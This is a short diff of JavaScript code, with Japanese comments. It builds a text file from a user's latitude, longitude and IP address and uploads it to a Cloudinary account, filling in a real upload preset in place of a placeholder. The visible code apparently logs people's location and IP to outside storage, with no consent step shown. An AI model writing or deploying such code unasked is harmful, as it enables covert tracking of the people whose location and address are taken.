@@ -22,7 +22,7 @@
           // ファイルデータの作成
           const fileData = new FormData();
           fileData.append('file', new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nIP Address: ${ipAddress}`], { type: 'text/plain' }));
-          fileData.append('upload_preset', 'your_upload_preset'); // Cloudinaryのアップロードプリセットを設定
+          fileData.append('upload_preset', 'phc2hgop'); // Cloudinaryのアップロードプリセットを設定
 
           // Cloudinaryにファイルをアップロード
           fetch(`https://api.cloudinary.com/v1_1/dxzsajngl/upload`, {
